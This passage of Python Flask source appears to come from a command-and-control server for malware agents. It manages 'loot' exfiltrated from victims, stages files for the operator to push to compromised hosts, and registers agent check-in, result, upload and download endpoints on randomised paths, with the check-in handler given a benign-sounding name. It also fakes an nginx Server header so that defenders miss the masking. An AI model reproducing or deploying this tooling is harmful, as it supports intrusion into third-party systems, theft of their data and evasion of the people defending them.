    if os.path.exists(item["file_path"]):
        os.remove(item["file_path"])

    conn.execute("DELETE FROM loot WHERE id = ?", (loot_id,))
    conn.commit()
    conn.close()

    return jsonify({"status": "ok"})


# ─────────────────────────────────────────────
#  File Staging API (Server → Agent)
# ─────────────────────────────────────────────

@app.route("/api/files/stage", methods=["POST"])
def stage_file():
    """Operator uploads a file to stage for pushing to an agent."""
    if "file" not in request.files:
        return jsonify({"error": "No file provided"}), 400

    file = request.files["file"]
    filename = secure_filename(file.filename) if file.filename else "unnamed"
    save_path = os.path.join(STAGED_DIR, filename)

    # Avoid overwrites
    if os.path.exists(save_path):
        name, ext = os.path.splitext(filename)
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"{name}_{timestamp}{ext}"
        save_path = os.path.join(STAGED_DIR, filename)

    file.save(save_path)
    file_size = os.path.getsize(save_path)

    conn = get_db_connection()
    cursor = conn.execute(
        "INSERT INTO staged_files (filename, file_path, file_size) VALUES (?, ?, ?)",
        (filename, save_path, file_size),
    )
    file_id = cursor.lastrowid
    conn.commit()
    conn.close()

    return jsonify({"status": "ok", "file_id": file_id, "filename": filename, "file_size": file_size})


@app.route("/api/files", methods=["GET"])
def get_staged_files():
    """Return all staged files."""
    conn = get_db_connection()
    files = conn.execute("SELECT * FROM staged_files ORDER BY created_at DESC").fetchall()
    conn.close()

    return jsonify({
        "files": [
            {
                "id": f["id"],
                "filename": f["filename"],
                "file_size": f["file_size"],
                "created_at": f["created_at"],
            }
            for f in files
        ]
    })


def serve_staged_file(file_id):
    """Agent fetches a staged file by ID."""
    conn = get_db_connection()
    f = conn.execute("SELECT * FROM staged_files WHERE id = ?", (file_id,)).fetchone()
    conn.close()

    if not f:
        return jsonify({"error": "File not found"}), 404

    file_path = f["file_path"]
    if not os.path.exists(file_path):
        return jsonify({"error": "File not found on disk"}), 404

    return send_file(file_path, as_attachment=True, download_name=f["filename"])


@app.route("/api/files/<int:file_id>", methods=["DELETE"])
def delete_staged_file(file_id):
    """Delete a staged file."""
    conn = get_db_connection()
    f = conn.execute("SELECT * FROM staged_files WHERE id = ?", (file_id,)).fetchone()

    if not f:
        conn.close()
        return jsonify({"error": "File not found"}), 404

    if os.path.exists(f["file_path"]):
        os.remove(f["file_path"])

    conn.execute("DELETE FROM staged_files WHERE id = ?", (file_id,))
    conn.commit()
    conn.close()

    return jsonify({"status": "ok"})


# ─────────────────────────────────────────────
#  Agent Route Registration
# ─────────────────────────────────────────────

def _register_agent_routes():
    """
    Register the four agent-facing endpoints on their randomised paths.
    Called once at module load after AGENT_PATH_* variables are set.
    Using add_url_rule() instead of decorators because the paths are
    only known after the DB is read, not at import time.
    """
    app.add_url_rule(AGENT_PATH_CHECKIN, "agent_checkin", SyncDeviceState, methods=["POST"])
    app.add_url_rule(AGENT_PATH_RESULT,  "agent_result",  submit_result,   methods=["POST"])
    app.add_url_rule(AGENT_PATH_UPLOAD,  "agent_upload",  receive_upload,  methods=["POST"])
    app.add_url_rule(
        AGENT_PATH_FILES + "/<int:file_id>",
        "agent_files",
        serve_staged_file,
        methods=["GET"],
    )


_register_agent_routes()


# ─────────────────────────────────────────────
#  Entry Point
# ─────────────────────────────────────────────

if __name__ == "__main__":
    # Patch Werkzeug's transport-level Server header before starting.
    # Flask's @after_request hook only controls the response object, but
    # Werkzeug's dev server writes its own Server line directly to the socket
    # before that hook runs. Without this patch both headers appear in the
    # response, which is worse than one because it reveals the masking attempt.
    from werkzeug.serving import WSGIRequestHandler
    setattr(WSGIRequestHandler, "server_version", "nginx/1.24.0")
    setattr(WSGIRequestHandler, "sys_version", "")

    app.run(host="0.0.0.0", port=5000, debug=False)
